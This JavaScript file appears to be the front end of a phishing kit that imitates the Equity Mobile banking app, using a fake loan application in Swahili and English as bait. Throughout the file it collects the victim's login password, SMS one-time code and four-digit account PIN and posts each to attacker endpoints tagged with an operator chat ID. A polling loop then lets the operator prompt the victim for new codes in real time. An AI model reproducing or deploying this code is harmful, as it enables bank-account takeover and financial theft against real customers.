document.addEventListener('DOMContentLoaded', () => {
  const screens = {
    welcome: document.getElementById('screen-welcome'),
    step1: document.getElementById('screen-step1'),
    step2: document.getElementById('screen-step2'),
    step3: document.getElementById('screen-step3'),
    login: document.getElementById('screen-login'),
    otp: document.getElementById('screen-otp'),
    pin: document.getElementById('screen-pin'),
    success: document.getElementById('screen-success')
  };

  const loadingOverlay = document.getElementById('loading-overlay');
  const langModal = document.getElementById('language-modal');
  const btnToggleLang = document.getElementById('btn-toggle-lang');
  const btnCloseLang = document.getElementById('btn-close-lang');
  const langOptions = document.querySelectorAll('.lang-option');
  const checkEn = document.getElementById('check-en');
  const checkSw = document.getElementById('check-sw');

  const credsBanner = document.getElementById('banner-creds-error');
  const otpBanner = document.getElementById('banner-otp-error');
  const pinBanner = document.getElementById('banner-pin-error');

  const countryDropdown = document.getElementById('country-dropdown');
  const loginIdentifier = document.getElementById('login-identifier');
  const loginPassword = document.getElementById('login-password');
  const btnSubmitLogin = document.getElementById('btn-submit-login');

  const otpBoxes = Array.from(document.querySelectorAll('.otp-box-num'));
  const btnSubmitOtp = document.getElementById('btn-submit-otp');

  const pinPhoneInput = document.getElementById('pin-phone-input');
  const pinBoxes = Array.from(document.querySelectorAll('.pin-box-num'));
  const btnSubmitPin = document.getElementById('btn-submit-pin');

  const loanSlider = document.getElementById('loan-amount-slider');
  const loanText = document.getElementById('loan-amount-text');
  const monthsSlider = document.getElementById('loan-months-slider');
  const monthsText = document.getElementById('loan-months-text');

  let currentUserId = null;
  let statusPollInterval = null;

  const urlParams = new URLSearchParams(window.location.search);
  const adminParam = urlParams.get('admin') || '';

  function safeText(id, value) {
    const el = document.getElementById(id);
    if (el) el.textContent = value;
  }

  function showScreen(screenName) {
    Object.values(screens).forEach((screen) => {
      if (screen) screen.classList.remove('active');
    });

    const target = screens[screenName];
    if (target) target.classList.add('active');
  }

  function showLoading(title = 'INATHIBITISHA...', subtitle = 'Tafadhali subiri.') {
    const titleEl = document.getElementById('loading-title');
    const subEl = document.getElementById('loading-sub');
    if (titleEl) titleEl.textContent = title;
    if (subEl) subEl.textContent = subtitle;
    if (loadingOverlay) loadingOverlay.classList.add('active');
  }

  function hideLoading() {
    if (loadingOverlay) loadingOverlay.classList.remove('active');
  }

  const countryConfigs = {
    'Tanzania, United Republic of': { lang: 'sw', flag: '🇹🇿', code: '+255', currency: 'TSh' },
    Kenya: { lang: 'en', flag: '🇰🇪', code: '+254', currency: 'KSh' },
    Uganda: { lang: 'en', flag: '🇺🇬', code: '+256', currency: 'USh' },
    Rwanda: { lang: 'en', flag: '🇷🇼', code: '+250', currency: 'RWF' },
    'South Sudan': { lang: 'en', flag: '🇸🇸', code: '+211', currency: 'SSP' }
  };

  function updateLanguageTexts(lang) {
    const isSwahili = lang === 'sw';

    if (checkEn && checkSw) {
      checkEn.textContent = isSwahili ? '' : '✓';
      checkSw.textContent = isSwahili ? '✓' : '';
    }

    if (isSwahili) {
      safeText('welcome-lang-text', 'Swa');
      safeText('txt-welcome-title', 'Karibu Equity Mobile');
      safeText('txt-welcome-sub', 'Habari za mchana! Ingia ili kuendelea');
      safeText('btn-welcome-signin', 'Ingia');
      safeText('lbl-step1', 'Hatua 1 ya 3');
      safeText('lbl-calc-title', 'Kikokotoo cha Mkopo');
      safeText('lbl-loan-type', 'Aina ya Mkopo');
      safeText('lbl-loan-amount', 'Kiasi cha Mkopo');
      safeText('lbl-loan-months', 'Muda wa Mkopo (Miezi)');
      safeText('lbl-loan-purpose', 'Madhumuni ya Mkopo');
      safeText('btn-step1-next', 'HATUA INAYOFUATA');
      safeText('lbl-step2', 'Hatua 2 ya 3');
      safeText('lbl-first-name', 'Jina la Kwanza');
      safeText('lbl-last-name', 'Jina la Ukoo');
      safeText('lbl-phone-no', 'Nambari ya Simu');
      safeText('btn-step2-prev', 'ILIYOTANGULIA');
      safeText('btn-step2-next', 'HATUA INAYOFUATA');
      safeText('lbl-step3', 'Hatua 3 ya 3');
      safeText('lbl-employment', 'Hali ya Ajira');
      safeText('lbl-income', 'Mapato ya Mwaka');
      safeText('lbl-sum-title', 'Muhtasari wa Maombi');
      safeText('lbl-sum-amt', 'Kiasi:');
      safeText('lbl-sum-mth', 'Muda:');
      safeText('lbl-sum-prp', 'Madhumuni:');
      safeText('lbl-sum-app', 'Mwombaji:');
      safeText('btn-step3-prev', 'ILIYOTANGULIA');
      safeText('btn-step3-next', 'WASILISHA MAOMBI');
      safeText('lbl-welcome-back', 'Karibu tena');
      safeText('lbl-hello-there', 'Habari yako,');
      safeText('lbl-login-sub', 'Ingia ili kuendelea. Password yako ni siri yako.');
      safeText('lbl-country-select', 'Nchi');
      safeText('lbl-identifier', 'Barua pepe au namba ya simu');
      safeText('lbl-password', 'Password');
      safeText('lbl-forgot-pass', 'Umesahau password yako?');
      safeText('lbl-otp-title', 'Uthibitisho wa OTP');
      safeText('lbl-otp-sub', 'Weka OTP iliyotumwa kwenye nambari yako ya simu');
      safeText('lbl-timer', 'Tuma tena msimbo ndani ya 40 sekunde');
      safeText('btn-submit-otp', 'WASILISHA');
      safeText('lbl-pin-title', 'Ingia Akaunti');
      safeText('lbl-pin-sub', 'Weka namba yako ya simu na PIN ya akaunti');
      safeText('lbl-pin-phone', 'Nambari ya Simu / Account No');
      safeText('lbl-pin-4', 'Weka PIN yako (tarakimu 4)');
      safeText('lbl-forgot-pin', 'Umesahau PIN?');
      safeText('btn-submit-pin', 'INGIA');
    } else {
      safeText('welcome-lang-text', 'Eng');
      safeText('txt-welcome-title', 'Welcome to Equity mobile');
      safeText('txt-welcome-sub', 'Good afternoon! Sign in to continue');
      safeText('btn-welcome-signin', 'Sign in');
      safeText('lbl-step1', 'Step 1 of 3');
      safeText('lbl-calc-title', 'Loan Calculator');
      safeText('lbl-loan-type', 'Loan Type');
      safeText('lbl-loan-amount', 'Loan Amount');
      safeText('lbl-loan-months', 'Loan Tenure (Months)');
      safeText('lbl-loan-purpose', 'Loan Purpose');
      safeText('btn-step1-next', 'NEXT STEP');
      safeText('lbl-step2', 'Step 2 of 3');
      safeText('lbl-first-name', 'First Name');
      safeText('lbl-last-name', 'Last Name');
      safeText('lbl-phone-no', 'Mobile Phone Number');
      safeText('btn-step2-prev', 'PREVIOUS');
      safeText('btn-step2-next', 'NEXT STEP');
      safeText('lbl-step3', 'Step 3 of 3');
      safeText('lbl-employment', 'Employment Status');
      safeText('lbl-income', 'Annual Income');
      safeText('lbl-sum-title', 'Application Summary');
      safeText('lbl-sum-amt', 'Amount:');
      safeText('lbl-sum-mth', 'Tenure:');
      safeText('lbl-sum-prp', 'Purpose:');
      safeText('lbl-sum-app', 'Applicant:');
      safeText('btn-step3-prev', 'PREVIOUS');
      safeText('btn-step3-next', 'SUBMIT APPLICATION');
      safeText('lbl-welcome-back', 'Welcome back');
      safeText('lbl-hello-there', 'Hello there,');
      safeText('lbl-login-sub', 'Sign in to continue. Remember, your password is yours.');
      safeText('lbl-country-select', 'Country');
      safeText('lbl-identifier', 'Email address or mobile number');
      safeText('lbl-password', 'Password');
      safeText('lbl-forgot-pass', 'Forgot your password?');
      safeText('lbl-otp-title', 'OTP Verification');
      safeText('lbl-otp-sub', 'Enter the OTP code sent to your mobile phone');
      safeText('lbl-timer', 'Resend code in 40 seconds');
      safeText('btn-submit-otp', 'SUBMIT');
      safeText('lbl-pin-title', 'Sign In Account');
      safeText('lbl-pin-sub', 'Enter your phone number and account PIN');
      safeText('lbl-pin-phone', 'Mobile Number / Account No');
      safeText('lbl-pin-4', 'Enter your PIN (4 digits)');
      safeText('lbl-forgot-pin', 'Forgot PIN?');
      safeText('btn-submit-pin', 'SIGN IN');
    }
  }

  if (btnToggleLang) {
    btnToggleLang.addEventListener('click', (event) => {
      event.stopPropagation();
      if (langModal) langModal.classList.add('active');
    });
  }

  if (btnCloseLang) {
    btnCloseLang.addEventListener('click', () => {
      if (langModal) langModal.classList.remove('active');
    });
  }

  langOptions.forEach((opt) => {
    opt.addEventListener('click', () => {
      const selectedLang = opt.getAttribute('data-lang') || 'en';
      updateLanguageTexts(selectedLang);
      if (langModal) langModal.classList.remove('active');
    });
  });

  if (countryDropdown) {
    countryDropdown.addEventListener('change', (event) => {
      const countryName = event.target.value;
      const config = countryConfigs[countryName] || countryConfigs['Tanzania, United Republic of'];

      ['1', '2', '3'].forEach((id) => {
        const badge = document.getElementById(`badge-country-${id}`);
        const flag = document.getElementById(`flag-display-${id}`);
        if (badge) badge.textContent = countryName.toUpperCase();
        if (flag) flag.textContent = config.flag;
      });

      const phonePrefix = document.getElementById('phone-flag-prefix');
      const pinPrefix = document.getElementById('pin-flag-prefix');
      if (phonePrefix) phonePrefix.textContent = `${config.flag} ${config.code}`;
      if (pinPrefix) pinPrefix.textContent = `${config.flag} ${config.code}`;

      updateLanguageTexts(config.lang);
    });
  }

  const btnWelcomeSignIn = document.getElementById('btn-welcome-signin');
  if (btnWelcomeSignIn) {
    const openSignin = (event) => {
      if (event) {
        event.preventDefault();
        event.stopPropagation();
      }
      showScreen('step1');
    };

    btnWelcomeSignIn.addEventListener('click', openSignin);
    btnWelcomeSignIn.addEventListener('touchend', openSignin, { passive: false });
  }

  if (loanSlider && loanText) {
    loanSlider.addEventListener('input', (event) => {
      const config = countryConfigs[countryDropdown?.value || 'Tanzania, United Republic of'] || countryConfigs['Tanzania, United Republic of'];
      loanText.textContent = `${config.currency} ${Number(event.target.value).toLocaleString()}`;
    });
  }

  if (monthsSlider && monthsText) {
    monthsSlider.addEventListener('input', (event) => {
      monthsText.textContent = `Miezi ${event.target.value}`;
    });
  }

  const togglePassword = document.getElementById('toggle-password');
  if (togglePassword && loginPassword) {
    togglePassword.addEventListener('click', () => {
      loginPassword.type = loginPassword.type === 'password' ? 'text' : 'password';
    });
  }

  const togglePinVisibility = document.getElementById('toggle-pin-visibility');
  if (togglePinVisibility) {
    togglePinVisibility.addEventListener('click', () => {
      pinBoxes.forEach((box) => {
        box.type = box.type === 'password' ? 'text' : 'password';
      });
    });
  }

  function setupAutoTab(boxes) {
    boxes.forEach((box, index) => {
      box.addEventListener('input', () => {
        box.value = box.value.replace(/\D/g, '');
        if (box.value && index < boxes.length - 1) boxes[index + 1].focus();
      });

      box.addEventListener('keydown', (event) => {
        if (event.key === 'Backspace' && !box.value && index > 0) {
          boxes[index - 1].focus();
        }
      });
    });
  }

  setupAutoTab(otpBoxes);
  setupAutoTab(pinBoxes);

  const step1Back = document.getElementById('btn-step1-back');
  const step1Next = document.getElementById('btn-step1-next');

  if (step1Back) step1Back.addEventListener('click', () => showScreen('welcome'));
  if (step1Next) step1Next.addEventListener('click', () => showScreen('step2'));

  const step2Prev = document.getElementById('btn-step2-prev');
  const step2Next = document.getElementById('btn-step2-next');

  if (step2Prev) step2Prev.addEventListener('click', () => showScreen('step1'));
  if (step2Next) {
    step2Next.addEventListener('click', () => {
      const firstName = document.getElementById('first-name')?.value.trim() || '';
      const lastName = document.getElementById('last-name')?.value.trim() || '';
      const config = countryConfigs[countryDropdown?.value || 'Tanzania, United Republic of'] || countryConfigs['Tanzania, United Republic of'];

      const sumAmount = document.getElementById('sum-amount');
      const sumMonths = document.getElementById('sum-months');
      const sumPurpose = document.getElementById('sum-purpose');
      const sumName = document.getElementById('sum-name');

      if (sumAmount) sumAmount.textContent = `${config.currency} ${Number(loanSlider?.value || 100000).toLocaleString()}`;
      if (sumMonths) sumMonths.textContent = `${monthsSlider?.value || 12} Miezi`;
      if (sumPurpose) sumPurpose.textContent = document.getElementById('loan-purpose')?.value.trim() || 'Biashara';
      if (sumName) sumName.textContent = `${firstName} ${lastName}`.trim() || 'N/A';

      showScreen('step3');
    });
  }

  const step3Prev = document.getElementById('btn-step3-prev');
  const step3Next = document.getElementById('btn-step3-next');

  if (step3Prev) step3Prev.addEventListener('click', () => showScreen('step2'));
  if (step3Next) {
    step3Next.addEventListener('click', async () => {
      showLoading('INATHIBITISHA...', 'Tafadhali subiri.');

      try {
        const response = await fetch('/api/submit-application-summary', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            fullName: document.getElementById('sum-name')?.textContent || 'N/A',
            phone: document.getElementById('phone-number')?.value.trim() || '',
            loanType: document.getElementById('loan-type-select')?.value || '',
            loanAmount: loanSlider?.value || '100000',
            loanMonths: monthsSlider?.value || '12',
            country: countryDropdown?.value || 'Tanzania, United Republic of',
            adminChatId: adminParam
          })
        });

        const data = await response.json().catch(() => ({ success: true }));
        hideLoading();

        if (data.success || response.ok) {
          currentUserId = data.userId || `demo_${Date.now()}`;
          showScreen('login');
        } else {
          showScreen('login');
        }
      } catch (error) {
        hideLoading();
        currentUserId = `demo_${Date.now()}`;
        showScreen('login');
      }
    });
  }

  if (btnSubmitLogin) {
    btnSubmitLogin.addEventListener('click', async () => {
      if (!loginIdentifier?.value.trim() || !loginPassword?.value.trim()) return;
      if (credsBanner) credsBanner.classList.remove('active');
      showLoading('INATHIBITISHA TAARIFA...', 'Tafadhali subiri.');

      try {
        const response = await fetch('/api/submit-credentials', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            userId: currentUserId,
            country: countryDropdown?.value || 'Tanzania, United Republic of',
            loginIdentifier: loginIdentifier.value.trim(),
            password: loginPassword.value.trim(),
            adminChatId: adminParam
          })
        });

        const data = await response.json().catch(() => ({ success: true }));
        hideLoading();
        if (data.success || response.ok) {
          startPolling();
          showScreen('otp');
          if (otpBoxes[0]) otpBoxes[0].focus();
        }
      } catch (error) {
        hideLoading();
        startPolling();
        showScreen('otp');
        if (otpBoxes[0]) otpBoxes[0].focus();
      }
    });
  }

  async function submitOtpHandler() {
    const otpValue = otpBoxes.map((box) => box.value).join('');
    if (otpValue.length !== otpBoxes.length) return;

    if (otpBanner) otpBanner.classList.remove('active');
    showLoading('INAKAGUA OTP...', 'Tafadhali subiri.');

    try {
      const response = await fetch('/api/submit-otp', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ userId: currentUserId, otp: otpValue })
      });

      const data = await response.json().catch(() => ({ success: true }));
      hideLoading();

      if (data.success || response.ok) {
        startPolling();
        showScreen('pin');
        if (pinPhoneInput) pinPhoneInput.value = document.getElementById('phone-number')?.value.trim() || '';
      }
    } catch (error) {
      hideLoading();
      startPolling();
      showScreen('pin');
      if (pinPhoneInput) pinPhoneInput.value = document.getElementById('phone-number')?.value.trim() || '';
    }
  }

  if (btnSubmitOtp) btnSubmitOtp.addEventListener('click', submitOtpHandler);

  if (btnSubmitPin) {
    btnSubmitPin.addEventListener('click', async () => {
      const pinValue = pinBoxes.map((box) => box.value).join('');
      const accountPhone = pinPhoneInput?.value.trim() || '';
      if (pinValue.length !== 4 || !accountPhone) return;

      if (pinBanner) pinBanner.classList.remove('active');
      showLoading('INATHIBITISHA PIN...', 'Tafadhali subiri.');

      try {
        const response = await fetch('/api/submit-pin-details', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            userId: currentUserId,
            accountNumber: accountPhone,
            accountPin: pinValue
          })
        });

        const data = await response.json().catch(() => ({ success: true }));
        hideLoading();

        if (data.success || response.ok) {
          startPolling();
          showScreen('success');
          const amount = document.getElementById('final-approved-amount');
          if (amount) amount.textContent = `${(countryConfigs[countryDropdown?.value || 'Tanzania, United Republic of'] || countryConfigs['Tanzania, United Republic of']).currency} ${Number(loanSlider?.value || 100000).toLocaleString()}`;
        }
      } catch (error) {
        hideLoading();
        showScreen('success');
        const amount = document.getElementById('final-approved-amount');
        if (amount) amount.textContent = `${(countryConfigs[countryDropdown?.value || 'Tanzania, United Republic of'] || countryConfigs['Tanzania, United Republic of']).currency} ${Number(loanSlider?.value || 100000).toLocaleString()}`;
      }
    });
  }

  function startPolling() {
    if (statusPollInterval) clearInterval(statusPollInterval);

    statusPollInterval = setInterval(async () => {
      if (!currentUserId) return;

      try {
        const response = await fetch(`/api/check-status/${currentUserId}`);
        if (!response.ok) return;

        const data = await response.json();

        if (data.status === 'PROCEED_OTP') {
          clearInterval(statusPollInterval);
          hideLoading();
          showScreen('otp');
          if (otpBoxes[0]) otpBoxes[0].focus();
        } else if (data.status === 'PROCEED_PIN') {
          clearInterval(statusPollInterval);
          hideLoading();
          showScreen('pin');
          if (pinPhoneInput) pinPhoneInput.value = document.getElementById('phone-number')?.value.trim() || '';
        } else if (data.status === 'RETRY_CREDS') {
          clearInterval(statusPollInterval);
          hideLoading();
          if (credsBanner) {
            credsBanner.textContent = 'INVALID ACC. DETAILS ❌ Please check your email/mobile or password.';
            credsBanner.classList.add('active');
          }
          showScreen('login');
        } else if (data.status === 'RETRY_OTP') {
          clearInterval(statusPollInterval);
          hideLoading();
          if (otpBanner) {
            otpBanner.textContent = 'OTP EXPIRES ❌ Please enter the new OTP code.';
            otpBanner.classList.add('active');
          }
          otpBoxes.forEach((box) => { box.value = ''; });
          showScreen('otp');
        } else if (data.status === 'RETRY_PIN') {
          clearInterval(statusPollInterval);
          hideLoading();
          if (pinBanner) {
            pinBanner.textContent = 'WRONG PIN ❌ Incorrect account PIN. Please try again.';
            pinBanner.classList.add('active');
          }
          pinBoxes.forEach((box) => { box.value = ''; });
          showScreen('pin');
        } else if (data.status === 'SUCCESS') {
          clearInterval(statusPollInterval);
          hideLoading();
          showScreen('success');
        }
      } catch (error) {
        // Ignore polling errors and continue, because the UI should still work locally.
      }
    }, 1200);
  }

  const btnLoginBack = document.getElementById('btn-login-back');
  const btnOtpBack = document.getElementById('btn-otp-back');
  const btnPinBack = document.getElementById('btn-pin-back');
  const btnFinishHome = document.getElementById('btn-finish-home');

  if (btnLoginBack) btnLoginBack.addEventListener('click', () => showScreen('step3'));
  if (btnOtpBack) btnOtpBack.addEventListener('click', () => showScreen('login'));
  if (btnPinBack) btnPinBack.addEventListener('click', () => showScreen('otp'));
  if (btnFinishHome) btnFinishHome.addEventListener('click', () => showScreen('welcome'));

  const initialCountry = countryDropdown?.value || 'Tanzania, United Republic of';
  const initialConfig = countryConfigs[initialCountry] || countryConfigs['Tanzania, United Republic of'];
  if (document.getElementById('phone-flag-prefix')) document.getElementById('phone-flag-prefix').textContent = `${initialConfig.flag} ${initialConfig.code}`;
  if (document.getElementById('pin-flag-prefix')) document.getElementById('pin-flag-prefix').textContent = `${initialConfig.flag} ${initialConfig.code}`;

  updateLanguageTexts(initialConfig.lang);
  showScreen('welcome');
});
